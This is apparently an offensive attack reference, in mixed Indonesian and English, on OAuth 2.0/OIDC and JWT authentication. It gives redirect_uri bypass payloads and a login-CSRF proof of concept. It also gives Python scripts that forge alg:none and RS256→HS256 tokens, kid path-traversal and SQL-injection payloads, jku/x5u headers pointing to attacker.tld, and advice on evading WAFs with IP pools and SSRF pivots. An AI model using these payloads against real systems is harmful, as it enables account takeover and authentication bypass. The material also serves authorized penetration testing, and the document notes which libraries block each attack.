# oauth-jwt — auth

# OAuth 2.0 / OIDC + JWT — Attack Reference

## 0. Peta Alur & Titik Serang

| Fase | Endpoint | Vektor |
|---|---|---|
| Authorize | `/authorize` | redirect_uri, state, PKCE, mix-up |
| Consent | `/consent` | code leak via Referer, open redirect |
| Token | `/token` | code redemption, PKCE downgrade, client auth |
| Resource | `/userinfo`, API | JWT alg/kid/jku, claim abuse |

---

## 1. redirect_uri Abuse

### 1.1 Path Traversal / Path Confusion

**Kirim:**
```
GET /authorize?client_id=app1&response_type=code&scope=openid
  &redirect_uri=https://app.example.com/oauth/callback/../../evil
```
Or encoded: `%2e%2e%2f%2e%2e%2fevil`, `..%252f`, `%2F..%2F`, `;/..;/`, `%09/`, `%00`.

**What you see:** 302 with `Location: https://app.example.com/evil?code=...` or `https://evil.example.com/?code=...` when the reverse proxy (nginx 1.25 default `merge_slashes on`, but `alias` with `../` still leaks) normalizes the path.

**Why it works:** the IdP validates the *prefix string* (`startswith`) without normalizing the path; the target app performs path normalization at a different layer (nginx → app) so the `code` lands on an attacker-controlled path (e.g. an `/evil` endpoint that reflects the query).

**Common false positive:** Chrome 131 & Firefox 133 already normalize `..` in the URL bar before the request goes out — always test via `curl --path-as-is` and a raw socket, not from the browser.

### 1.2 Regex Lemah

Pola rawan:

| Pola | Bypass |
|---|---|
| `^https://app\.example\.com` | `https://app.example.com.evil.tld/cb` |
| `.*app\.example\.com.*` | `https://evil.tld/?x=app.example.com` |
| `https://app\.example\.com/.*` | `https://app.example.com/redirect?u=//evil` (open redirect chain) |
| `([a-z]+)://([^/]+)` in JS | `javascript://app.example.com/%0aalert(1)` (if the scheme is not enforced) |
| `[a-z]+://.*\.example\.com` | `https://a.example.com@evil.tld` (userinfo abuse) |

**Kirim / cek:**
```
redirect_uri=https://app.example.com%2eevil.tld/cb
redirect_uri=https://app.example.com@evil.tld/cb
redirect_uri=https://app.example.com%09.evil.tld
redirect_uri=https://app.example.com#@evil.tld
redirect_uri=https://app.example.com\/\/evil.tld
```
**What you see:** 302 to `evil.tld` with `code`. **Fails when:** the IdP performs an exact match on the registered URI (best practice OAuth 2.1 §3.1.2).

### 1.3 Subdomain Takeover

**Send:** `redirect_uri=https://staging.example.com/cb` where `staging` = a CNAME to `foo.herokuapp.com` (unclaimed), `foo.s3.amazonaws.com` (bucket deleted), or `foo.github.io` (user deleted).

**Proof:**
```bash
dig +short staging.example.com CNAME   # foo.herokuapp.com.
curl -sI https://staging.example.com   # 404 "No such app"
```
Register the missing resource → `code` lands. **Why it works:** the IdP fully trusts the subdomain; there is no ownership check of the target resource. **Fails when:** the wildcard `*.example.com` is already filtered out of the allowed redirect URI list.

---

## 2. Missing / Weak `state`

**Send:** `GET /authorize?...&redirect_uri=...` **without** `state`.

**What you see:** 302 with `code` straight to the RP; the RP exchanges the code without checking `state` → **login CSRF**.

**PoC minimal (login CSRF):**
```html
<img src="https://idp.example.com/authorize?client_id=victim
  &response_type=code&scope=openid
  &redirect_uri=https://rp.example.com/cb&state=" >
```
The victim is automatically logged into the attacker's account (the attacker is already authenticated at the IdP → the code is bound to the attacker's session).

**Varian state weakness:**
- `state` = fixed string (`abc123`) → replayable.
- `state` is not bound to the session (`session_id`) → the acceptor cannot tell them apart.
- `state` is decoded from a JWT without verifying the signature.

**Fails when:** the RP stores `state` in a `SameSite=Lax` cookie and compares server-side; state is one-time-use.

---

## 3. PKCE Downgrade

**Send:** Authorize **with** `code_challenge` + `code_challenge_method=S256`, but at `/token` omit `code_verifier` — or send the challenge at authorize, then at token send an empty `code_verifier` / length <43.

**Check at the IdP:**

| Behavior | Meaning |
|---|---|
| IdP issues `code` without storing the challenge → token exchange without verifier succeeds | PKCE not enforced (downgrade) |
| IdP rejects `plain` when the client is public, but accepts when `code_challenge_method` is omitted | downgrade to "no PKCE" |
| IdP accepts a different `code_verifier` after one failure | verifier not one-time / cache bug |

**Kirim downgrade otomatis:**
```bash
# step 1: challenge ada
curl -s "https://idp/authorize?client_id=pub&response_type=code&scope=openid\
&redirect_uri=https://rp/cb&code_challenge=XYZ&code_challenge_method=S256"
# step 2: token tanpa verifier
curl -s -X POST https://idp/token -d "grant_type=authorization_code&code=$CODE\
&client_id=pub&redirect_uri=https://rp/cb"
```
**What you see:** `{"access_token":...}` → PKCE not enforced. **Why it fails on modern IdPs (Keycloak 24+, Auth0 2024):** PKCE is mandatory for public clients; `code_challenge` is mandatory at authorize, verifier mandatory at token.

**Variant:** the attacker holds the `code` (via Referer/redirect abuse) without a `code_verifier` — if PKCE is optional, redemption succeeds.

---

## 4. Code Leak via Referer

**Scenario:** the RP puts third-party content on the callback page (analytics, CDN, image). The `code` is in the callback URL → leaks via `Referer`.

**Send:** Callback page loads `<script src="https://analytics.vendor/x.js">` or `<img src="https://cdn/x.png">`.

**Log attacker:**
```
GET /x.js  Referer: https://rp.example.com/cb?code=4/0AeanS...&state=...
```
**Check the RP response:** the `Referrer-Policy` header (Chrome 131 default = `strict-origin-when-cross-origin` → origin only, safe; **but** if the RP sets `unsafe-url` or `no-referrer-when-downgrade` → the full URL leaks).

**Redirect payload:** `redirect_uri=https://rp/cb?ext=https://attacker.tld` → the callback page reflects the external link the user clicks → full `Referer`.

**Mitigation that often leaks:** `Referrer-Policy: strict-origin-when-cross-origin` does **not** protect against same-origin leaks (script from another `rp.example.com`).

---

## 5. IdP Mix-up

**Setup:** the RP supports 2 IdPs (A, B). The attacker controls IdP A (or an account on A).

**Kirim:**
1. The user starts auth to the RP, the RP redirects to **A** with `state`.
2. The attacker replaces A's `authorize` response with a `code_A` that is valid at **A**, then the RP sends `code_A` to **B** (because the RP guesses the IdP from the request parameter, not from the session).
3. Or the reverse: the RP sends the `code` for the user at A to B's token endpoint → B rejects → but if B returns a token for user B (if the `code` is also valid at B via a shared code space), the attacker logs in as the victim.

**Kirim (PoC):**
```
# RP harus menyimpan issuer yang dipilih di sesi; test dengan:
GET /authorize?client_id=rp&response_type=code&scope=openid
  &redirect_uri=https://rp/cb&idp_hint=B   # attacker set hint=B
```
**What you see:** the RP exchanges the `code` (from A) at B; if B does not validate `client_id` + issuer → a token for user A is issued by B → session bypass.

**Why it fails on OIDC-compliant IdPs:** the `iss` in the token must match the issuer in the session; the RP stores the issuer in `state`/session.

---

## 6. JWT — `alg:none`

**Kirim:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlzcyI6ImlkcCIsImF1ZCI6ImFwcCIsImV4cCI6OTk5OTk5OTk5OSwiYWRtaW4iOnRydWV9.
```
(header `{"alg":"none"}`, signature kosong, trailing dot).

**Payload forge:**
```python
import base64, json
b = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
h = b({"alg":"none","typ":"JWT"})
p = b({"sub":"admin","iss":"https://idp","aud":"app","exp":9999999999,"role":"admin"})
print(f"{h}.{p}.")
```
**What you see:** 200 with admin data. **Why it fails:** modern libraries (jose 4.x, jsonwebtoken 9.x, PyJWT 2.9) reject `none` unless explicitly allowed; PyJWT requires `algorithms=["none"]` opt-in.

---

## 7. RS256 → HS256 Confusion

**Send:** Header `{"alg":"HS256","typ":"JWT"}`, sign with the RSA **public key** as the HMAC secret. The public key is available at `/jwks.json` or `/.well-known/jwks.json`.

**PoC (jwt_tool / manual):**
```python
import hmac, hashlib, base64, json, requests
pub = requests.get("https://idp/.well-known/jwks.json").json()["keys"][0]
# konversi JWK→PEM (jwcrypto) atau ambil cert
pem = jwk_to_pem(pub)
b = lambda d: base64.urlsafe_b64encode(d).rstrip(b'=').decode()
h = b(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
p = b(json.dumps({"sub":"admin","iss":"https://idp","aud":"app","exp":9999999999}).encode())
sig = b(hmac.new(pem, f"{h}.{p}".encode(), hashlib.sha256).digest())
print(f"{h}.{p}.{sig}")
```
**What you see:** 200 if the server determines `alg` from the header, not from the key. **Fails when:** the verifier parses `kid` → fetches an RSA-type key, `alg` mismatch → reject (node-jose, go-jose v3+ default).

**kid confusion variant:** `kid` points to a file path → server `readFile(kid)` → path traversal (see §8) or `kid` selects an attacker-planted key as the HS256 secret.

---

## 8. `kid` — Path Traversal / SQLi

**Kirim (path traversal):**
```json
{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
```
Server performs `fs.readFileSync(path.join('/keys', kid))` → reads `/dev/null` (empty) → HMAC secret = `""`.
```python
sig = hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest()
```
**Kirim (SQLi):**
```json
{"alg":"HS256","kid":"x' UNION SELECT 'knownsecret'-- -"}
```
**Appears:** 200 if query `SELECT key FROM keys WHERE id='{kid}'` returns attacker secret. **Check timing/error:** payload `x'` → SQL error in log; quick validation.

**Payload cepat:**
```
kid=x' UNION SELECT ''-- -
kid=../../../../proc/self/environ
kid=../../../../etc/passwd
```

---

## 9. `jwk` / `x5u` / `jku` Injection

**Kirim (jwk embedded):**
```json
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```
Server uses `jwk` from header for verification → attacker signs with their own private key.

**Kirim (jku):**
```json
{"alg":"RS256","kid":"attacker","jku":"https://attacker.tld/jwks.json"}
```
**Kirim (x5u):**
```json
{"alg":"RS256","x5u":"https://attacker.tld/cert.pem"}
```
**Cek:**
```bash
curl -s https://attacker.tld/jwks.json  # host JWKS attacker
# lalu kirim JWT signed dengan private key yang cocok
```
**Appears:** 200 admin. **Fails if:** server whitelists `jku`/`x5u` host (must exact match registered issuer), or ignores `jwk`/`jku`/`x5u` headers entirely (jose `embeddedJWK` opt-in). **Whitelist bypass variant:** `jku=https://idp.example.com.attacker.tld/jwks.json`, `jku=https://idp.example.com@attacker.tld/jwks.json`, `jku=https://idp.example.com%2F@attacker.tld`.

---

## 10. Claim Abuse (`iss` / `aud` / `exp`)

| Claim | Test | Evidence |
|---|---|---|
| `iss` | Token A (iss=`trusted`) presented to API that checks `aud` only | API 200 |
| `aud` | `aud` array: `["app-other","app-target"]` | Verifier naif cek `aud.includes("app-target")` → 200 |
| `aud` string matching | `app-target` vs `app-target.evil` | Verifier `startswith` → 200 |
| `exp` | Token `exp` in the past + lying `nbf` | Server doesn't check `exp` → 200 |
| `alg:ES256` vs `RS256` | Send ES256 with RS256 key | parse error / fallback |
| `typ` | `"typ":"JWT"` vs `"typ":"at+jwt"` | Server abaikan typ |

**Payload aud abuse:**
```json
{"iss":"https://idp","aud":["https://other-app","https://target-app"],"exp":9999999999,"sub":"admin"}
```
**Kirim:**
```bash
curl -s https://target-api/data -H "Authorization: Bearer $JWT"
```

**Test `iss` mismatch chain:** Token issued by IdP A, used at RP that only verifies signature (key from JWKS A) but **does not** match `iss` to registered issuer → token for another tenant accepted.

**Test `exp`:** `exp=0`, `exp=1`, `exp` missing, `exp` far (`9e15`) — note which returns 200.

---

## 11. Proof Request Flow (Summary per Technique)

| # | Technique | Send | Appears | Succeeds if |
|---|---|---|---|---|
| 1.1 | traversal | `redirect_uri=.../cb/../../evil` | 302 to `/evil` + `code` | proxy normalize differs from IdP |
| 1.2 | regex | `redirect_uri=app.example.com.evil.tld` | 302 to `evil.tld` | prefix/`.*` match |
| 1.3 | takeover | `redirect_uri=staging.example.com` | 302 + code to dangling CNAME | DNS dangling |
| 2 | missing state | authorize without `state` | code to RP, RP login | RP doesn't check state |
| 3 | PKCE downgrade | authorize +challenge, token without verifier | 200 token | PKCE optional |
| 4 | Referer | callback loads third-party resource | log `Referer: ...?code=` | weak Referrer-Policy |
| 5 | mix-up | hint IdP B to code from A | cross-issuer token | RP/IdP doesn't check issuer |
| 6 | alg:none | JWT header `alg:none`, sig kosong | 200 | lib accept none |
| 7 | RS→HS | HS256 sign with public key | 200 | alg from header |
| 8 | kid | `kid=../../dev/null` / SQLi | 200 | sink `readFile`/SQL |
| 9 | jku | `jku=https://attacker/jwks` | 200 | tak whitelist |
| 10 | aud/exp | `aud` array / `exp` past | 200 | verifier lemah |

---

## 12. Operational Pitfalls (that make techniques fail in the field)

1. **Chrome 131 / Firefox 133 normalize URL before request** — `..`, `%2e%2e`, `@`, `#` in redirects can only be tested via `curl --path-as-is`, `httpie --follow` disabled, or raw socket. Browser results are often false negative.
2. **Reverse proxy normalizes path** — nginx 1.25 `merge_slashes on`, `proxy_pass` with trailing slash truncates prefix; Apache 2.4 `MergeSlashes` + `AllowEncodedSlashes NoDecode` = different combination. Always test in two deploys (stage vs prod) — results are not portable.
3. **`state` stored in `SameSite=Strict` cookie** — login CSRF via `<img>` fails because cookie not sent from cross-site; use `<a>`/`window.open` top-level navigation (Lax) or iframe with `credentialless` if target is loose.
4. **IdP is getting stricter, not a soft target** — Keycloak 24+ exact-match redirect URI, requires PKCE for public client, `iss` validated in `state`; don't waste time on IdP endpoint if the RP already uses standard library.
5. **JWKS endpoint behind WAF/host whitelist** — `jku` to `attacker.tld` often blocked by RP egress firewall (deny all outbound non-whitelisted). Pivot to *SSRF-assisted* technique: `jku=https://internal-service/redirect?to=https://attacker.tld/jwks.json`.
6. **Public key format RS→HS confusion** — verifier accepts JWK (not PEM); sign HMAC with **byte** PEM (`-----BEGIN PUBLIC KEY-----`) often fails because library parses JWK first. Convert JWK→PEM (jwcrypto `jwk.export_to_pem()`) and ensure what's used for HMAC is the full PEM bytes including header/footer.
7. **`alg:none` in modern libraries** — jsonwebtoken 9.x, jose 4.x, PyJWT 2.9 default reject; find target with `jwt-decode` (without verify) that then calls `verify` with `algorithms` set from the JWT header itself (pattern `jsonwebtoken.decode` + weak config).
8. **`kid` sink is not file/SQL** — many verifiers use in-memory map (`keys[kid]`); `../../dev/null` = `undefined` → reject. Check first via error message / timing, then choose payload.
9. **`aud` admin API ≠ `aud` user API** — token from `/authorize` default `aud` often differs from resource server; claim abuse succeeds only if verifier is naive (`aud` contains, not equals; or skips `aud`).
10. **Log/timing in lab ≠ prod** — WAF (Cloudflare 2024, AWS WAF) rate-limits anomalous `/authorize` (redirect_uri variations) → needs IP pool. Traversal payloads in path against `/authorize` rarely reach app because WAF blocks `%2e%2e`.
11. **Clock skew** — `exp` abuse requires assumption server doesn't check `exp`; if server uses `nbf`/`iat` window (±60s), token with `exp` far in the future still rejected if `iat` is in the future.
12. **Referer not sent** — Chrome 131 default `strict-origin-when-cross-origin` + `upgrade-insecure-requests` + server `Referrer-Policy` sometimes `origin` → `code` doesn't leak; find page that explicitly `rel="noopener"` but still `unsafe-url`, or page that does `document.referrer` reflection.
13. **Subdomain takeover requires active DNS record** — `dig` CNAME exists but inactive (404 body) ≠ successful claim; verify provider-specific (Heroku "No such app", S3 `NoSuchBucket`, GitHub "The site you're looking for is not here") before claiming.
14. **PKCE downgrade in IdPs that use libs** — `oauthlib` 3.2.2 & `panva/node-oidc-provider` 8.x enforce PKCE if a `code_challenge` was ever sent; downgrade only works on custom/legacy IdPs.

---

## [reasoning trace]


